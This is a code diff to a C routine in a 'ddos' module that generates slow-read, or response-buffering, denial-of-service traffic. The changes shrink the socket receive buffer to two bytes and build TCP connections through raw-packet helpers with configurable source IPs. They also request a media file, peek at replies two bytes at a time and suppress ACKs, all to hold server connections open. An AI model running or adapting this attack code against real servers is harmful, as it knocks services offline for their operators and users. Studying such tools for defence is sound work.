@@ -5,7 +5,8 @@
 #include "base/time_check.h"
 #include "ddos/body_buffering.h"
 
-#define GET_METHOD "GET / HTTP/1.1\r\nHost: localhost\r\n\r\n"
+#define GET_METHOD "GET /Force.mp3 HTTP/1.1\r\nHost: localhost\r\n\r\n"
+
 #define RESPONSE_BUFFERING_CNT 20
 
 // session counting
@@ -67,19 +68,24 @@ void* generate_response_buffering(void *data) {
 			 if (connect(sock, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0) {
 			 perror("connect failed\n");
 			 }*/
+			int rvsz = 2;
+			setsockopt(sock, SOL_SOCKET, SO_RCVBUF, (const char*) &rvsz,
+					sizeof(rvsz));
 
 			sock = tcp_make_connection(inet_addr(g_resbuf_now_src_ip),
 					inet_addr(g_resbuf_now_dest_ip), &src_port,
-					g_resbuf_now_dest_port, &seq, &ack);
+					g_resbuf_now_dest_port, &seq, &ack,2);
 
 			char http_request[] = GET_METHOD;
 			/*if ((send(sock, http_request, strlen(http_request), 0)) < 0) {
 			 perror("get send err\n");
 			 }*/
+
+
 			tcp_socket_send_data(sock, inet_addr(g_resbuf_now_src_ip),
 					inet_addr(g_resbuf_now_dest_ip), src_port,
 					g_resbuf_now_dest_port,
-					GET_METHOD, strlen(GET_METHOD), seq, ack);
+					GET_METHOD, strlen(GET_METHOD), seq, ack,2);
 
 			response_buffering_cnt = 0;
 		}
@@ -91,18 +97,19 @@ void* generate_response_buffering(void *data) {
 		time_check(&g_resbuf_mutex, &g_resbuf_cond, &g_resbuf_before_time,
 				&g_resbuf_now_time, &g_resbuf_num_generated_in_sec);
 		// read a character
-		char buffer[1];
+		char buffer[2];
 		int recv_size = -1;
-		recv_size = recv(sock, buffer, 1, 0);
-		while (recv_size == -1)
-			;
+		recv_size = recv(sock,buffer,2, MSG_PEEK);
+		if (recv_size == -1) {
+			printf("no recv!\n");
+		}
 
-		tcp_socket_send_ack(sock, inet_addr(g_resbuf_now_src_ip),
+		/*tcp_socket_send_ack(sock, inet_addr(g_resbuf_now_src_ip),
 				inet_addr(g_resbuf_now_dest_ip), src_port,
-				g_resbuf_now_dest_port, seq, ack);
+				g_resbuf_now_dest_port, seq, ack);*/
 		ack++;
 
-		printf("Read : %c\n", buffer[0]);
+		printf("Read : %c\n", buffer[1]);
 		g_resbuf_num_generated_in_sec++;
 		g_resbuf_num_total++;
 		response_buffering_cnt++;
